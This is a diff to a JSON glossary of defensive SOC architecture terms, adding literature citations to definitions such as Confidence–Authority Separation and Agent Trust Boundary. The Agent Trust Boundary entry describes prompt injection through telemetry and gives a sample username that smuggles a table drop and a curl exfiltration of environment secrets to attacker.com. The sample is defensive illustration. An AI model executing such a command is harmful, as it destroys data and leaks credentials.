@@ -8,7 +8,7 @@
       "term": "Confidence–Authority Separation",
       "classification": "TIDIR-specific",
       "plain_english": "A detection system can be 99.9% confident that an attack is occurring and still possess zero permission to isolate an endpoint or disrupt operations. Epistemic belief is strictly decoupled from execution authority.",
-      "technical_definition": "An architectural invariant (INV-04) dictating that probabilistic reasoning engines, machine learning models, and heuristic correlators operate in an advisory capacity without intrinsic mutation privileges. All environmental transitions require independent policy authorization, identity verification, and blast-radius evaluation.",
+      "technical_definition": "An architectural synthesis adapting Saltzer & Schroeder's (1975) Separation of Mechanism and Policy to modern AI and probabilistic reasoning engines (INV-04). Dictates that probabilistic correlators, ML models, and LLM agents operate purely in an advisory capacity without intrinsic mutation privileges. All environmental transitions require independent policy authorization, identity verification, and blast-radius evaluation.",
       "why_tidir_uses_it": "In modern SecOps, autonomous agents and high-confidence alerts frequently trigger destructive containment actions without considering asset criticality or business impact. Decoupling belief from permission prevents self-granting authority and rogue containment storms.",
       "concrete_example": "A machine-learning model scores a suspicious process on an Active Directory domain controller with 0.999 malicious probability. Under Confidence–Authority Separation, this score does not allow the model to isolate the server. Instead, it submits an advisory proposal to the Defence Control Plane, which recognizes the host as Tier 0 Critical Infrastructure and restricts automated response to non-disruptive credential rotation and forensic memory capture.",
       "related_identifiers": ["INV-04", "ADR-0004", "CAP-DET-004"]
@@ -16,9 +16,9 @@
     {
       "id": "security-state-monotonicity",
       "term": "Security-State Monotonicity",
-      "classification": "TIDIR-specific",
+      "classification": "Adapted",
       "plain_english": "When an automated response action partially fails, the system must never roll back security barriers or leave the network more exposed than before the incident occurred. Recovery only moves forward.",
-      "technical_definition": "A formal invariant (INV-07) stipulating that every containment state transition must satisfy R_hat_A(s_{post}, M_t) ⊆ R_hat_A(s_{pre}, M_t), meaning post-transition attacker reachability relative to the validated environmental model M_t is a subset of, or equal to, pre-transition reachability. If an API call fails mid-playbook, traditional distributed rollback is prohibited in favour of forward containment escalation.",
+      "technical_definition": "Adapts distributed systems monotonicity and forward-compensating sagas (Garcia-Molina & Salem, 1987) to cyber defence containment (INV-07). Dictates that every containment state transition must satisfy R_hat_A(s_{post}, M_t) ⊆ R_hat_A(s_{pre}, M_t), meaning post-transition attacker reachability relative to the validated environmental model M_t is a subset of, or equal to, pre-transition reachability. If an API call fails mid-playbook, traditional distributed rollback is prohibited in favour of forward containment escalation.",
       "why_tidir_uses_it": "Traditional SOAR playbooks apply relational database transaction logic (commit or rollback). If an endpoint isolation succeeds but firewall rule application times out, rolling back the isolation re-opens network reachability for an active adversary.",
       "concrete_example": "An automated response tries to isolate a compromised workstation by revoking Kerberos tickets and isolating the switch port. If the switch API times out after tickets are revoked, the state machine does not restore the Kerberos tickets; it freezes the endpoint state and escalates containment to the upstream core firewall.",
       "formalism": "\\hat{\\mathcal{R}}_A(s_{\\text{post}}, \\mathcal{M}_t) \\subseteq \\hat{\\mathcal{R}}_A(s_{\\text{pre}}, \\mathcal{M}_t)",
@@ -27,9 +27,9 @@
     {
       "id": "evidential-independence",
       "term": "Evidential Independence",
-      "classification": "TIDIR-specific",
+      "classification": "Adapted",
       "plain_english": "Two alerts are not independent proof of an attack if they both came from the same underlying event. The system tracks that shared ancestry so the evidence is not counted twice.",
-      "technical_definition": "An invariant (INV-03) requiring risk-scoring and correlation engines to trace observation lineage to root entity events. When computing aggregate incident risk, co-derived detections sharing common ancestor nodes in the entity-finding graph are mathematically discounted to their marginal information gain.",
+      "technical_definition": "Adapts Bayesian conditional independence and causal DAG parent discounting (Pearl, 1988) to multi-sensor security analytics (INV-03). Requires risk-scoring and correlation engines to trace observation lineage to root entity events. When computing aggregate incident risk, co-derived detections sharing common ancestor nodes in the entity-finding graph are mathematically discounted to their marginal information gain.",
       "why_tidir_uses_it": "A single PowerShell command can trigger an EDR alert, an antivirus warning, a Windows Event Log 4688 alert, and a network anomaly. Treating these as four independent confirmations leads to false confidence inflation and operator fatigue.",
       "concrete_example": "Event E1 (an encoded PowerShell execution) triggers EDR alert A1, SIEM alert A2, and Sysmon alert A3. Rather than compounding risk as P(Compromise | A1, A2, A3) under an assumption of independence, the correlation engine recognizes that parent(A1) = parent(A2) = parent(A3) = E1, discounting duplicate signals.",
       "related_identifiers": ["INV-03", "ADR-0011", "CAP-INV-001"]
@@ -37,9 +37,9 @@
     {
       "id": "telemetry-preservation",
       "term": "Telemetry Preservation",
-      "classification": "TIDIR-specific",
+      "classification": "Adapted",
       "plain_english": "Security telemetry must never be thrown away simply because no active detection rule currently searches for it. Raw forensic evidence is preserved in open formats for historical investigation.",
-      "technical_definition": "An invariant (INV-01) mandating that line-rate event streams be written into open, columnar storage (e.g. Parquet/Iceberg on object storage) with unmapped attributes preserved under structured catch-all fields (unmapped_data), unless explicit governed policies (statutory data minimization, privacy regulations such as GDPR, legal privilege, or credential scrubbing) require transformation or destruction.",
+      "technical_definition": "Adapts big-data lakehouse architecture (schema-on-read, columnar storage, decoupled object storage) into an architectural invariant (INV-01). Mandates that line-rate event streams be written into open columnar storage (e.g. Parquet/Iceberg on object storage) with unmapped attributes preserved under structured catch-all fields (unmapped_data), strictly prohibiting edge-side semantic filtering except for statutory data minimization, legal privilege, or credential scrubbing.",
       "why_tidir_uses_it": "Volume-based SIEM licensing historically forced organizations to filter and drop raw telemetry at the collection boundary. When a novel zero-day is disclosed months later, security teams are blind during retrospective investigations.",
       "concrete_example": "DNS query logs containing uncommon query record types are not queried by active detection rules. Rather than discarding them, the telemetry fabric ingests and normalizes them into OCSF, storing unmapped vendor fields in JSON columns within long-term lakehouse partitions.",
       "related_identifiers": ["INV-01", "ADR-0002", "CAP-TEL-001"]
@@ -47,9 +47,9 @@
     {
       "id": "agent-trust-boundary",
       "term": "Agent Trust Boundary",
-      "classification": "TIDIR-specific",
+      "classification": "Adapted",
       "plain_english": "Autonomous AI reasoning models operate inside an isolated environment where all security logs and alert payloads are treated as potentially malicious. AI models can analyze and recommend, but they have no direct access to production execution tools.",
-      "technical_definition": "An architectural isolation boundary (INV-04, ADR-0004, ADR-0015) dividing the untrusted analytical plane from the trusted defence control plane. Because untrusted telemetry can carry prompt injection payloads, reasoning agents receive strictly read-only ephemeral identity tokens and submit proposed actions as structured abstract syntax trees (ASTs) for independent policy evaluation.",
+      "technical_definition": "Adapts classic security trust boundaries (Saltzer & Schroeder 1975; STRIDE) to isolate untrusted telemetry and probabilistic reasoning models from the deterministic defence control plane (INV-04, ADR-0004, ADR-0015). Because untrusted telemetry can carry prompt injection payloads, reasoning agents receive strictly read-only ephemeral identity tokens and submit proposed actions as structured abstract syntax trees (ASTs) for independent policy evaluation.",
       "why_tidir_uses_it": "Adversaries can embed prompt injection instructions inside HTTP headers, username fields, or script arguments. If an AI agent has direct tool-execution permissions, injected instructions could trick the agent into exfiltrating data or disabling defenses.",
       "concrete_example": "An attacker creates a user named '; DROP TABLE users; curl attacker.com/token?val=$(env)'. When an AI triage agent reads this event, the text is treated as raw data. Even if the agent's LLM is tricked into outputting a command to exfiltrate secrets, the Agent Trust Boundary prevents direct shell or outbound network access; the output is parsed as an invalid proposal schema and rejected by the policy kernel.",
       "related_identifiers": ["INV-04", "ADR-0004", "ADR-0015", "CAP-AI-001"]
@@ -57,9 +57,9 @@
     {
       "id": "incident-decision-dag",
       "term": "Incident Decision DAG",
-      "classification": "TIDIR-specific",
+      "classification": "Adapted",
       "plain_english": "Every key finding, hypothesis, policy check, and response action is permanently recorded in a tamper-evident graph, showing exactly why each decision was made and what raw evidence justified it.",
-      "technical_definition": "An immutable, directed acyclic graph (INV-10, ADR-0006) capturing the complete causal lineage of an incident investigation and response. Each node records input observation hashes, model versions, deterministic policy evaluations, authorizing identities, and operational outcomes.",
+      "technical_definition": "Adapts causal provenance directed acyclic graphs (Lamport 1978; W3C PROV) to record the immutable causal lineage of an incident investigation and response (INV-10, ADR-0006). Each node records input observation hashes, model versions, deterministic policy evaluations, authorizing identities, and operational outcomes.",
       "why_tidir_uses_it": "Post-incident reviews and legal audits often struggle to determine why an automated playbook executed or why an analyst reached a conclusion. The DAG provides deterministic reconstructability without relying on ephemeral logs.",
       "concrete_example": "Six months after a ransomware outbreak, auditors request justification for why an industrial SCADA link was isolated. The Incident Decision DAG references the root alert IDs, the exact OPA policy version, the operator consensus signature, and the execution confirmation timestamp.",
       "related_identifiers": ["INV-10", "ADR-0006", "CAP-INV-003"]
